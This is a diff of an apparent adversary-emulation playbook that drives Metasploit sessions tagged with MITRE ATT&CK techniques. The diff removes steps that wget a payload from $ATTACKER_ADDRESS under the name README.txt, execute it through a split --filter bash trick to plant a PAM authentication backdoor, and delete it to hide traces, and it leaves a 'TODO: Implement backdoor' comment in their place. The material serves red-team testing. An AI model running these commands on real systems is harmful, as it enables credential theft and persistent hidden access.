@@ -179,33 +179,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    session: "foothold"
-    cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1105,T1556.003"
-      tactics: "Command and Control,Persistence,Credential Access"
-      technique_name:"Ingress Tool Transfer,Modify Authentication Process: Pluggable Authentication Modules"
-
-
-  - type: msf-session
-    cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1218,T1556.003"
-      tactics: "Defense Evasion,Persistence,Credential Access"
-      technique_name: "System Binary Proxy Execution,Modify Authentication Process: Pluggable Authentication Modules"
-
-  - type: msf-session
-    cmd: rm /root/README.txt
-    session: "foothold"
-    end_str: "PWN >"
-    metadata:
-      techniques: "T1070.004"
-      tactics: "Defense Evasion"
-      technique_name: "Indicator Removal: File Deletion"
+  # TODO: Implement backdoor
 
   - type: msf-session
     cmd: rm linpeas.sh
